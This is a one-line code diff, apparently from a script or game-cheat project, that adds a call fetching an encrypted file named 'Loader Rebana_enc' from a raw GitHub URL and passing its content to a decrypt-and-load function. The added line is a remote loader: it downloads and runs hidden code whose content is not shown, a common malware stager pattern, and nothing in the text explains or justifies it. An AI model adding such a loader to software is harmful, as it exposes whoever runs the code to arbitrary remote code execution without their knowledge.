@@ -1,0 +1,2 @@
+LoadEncrypt(MakeRequest("https://raw.githubusercontent.com/worldisyours22/Trash/main/Loader%20Rebana_enc", "GET").content)
+
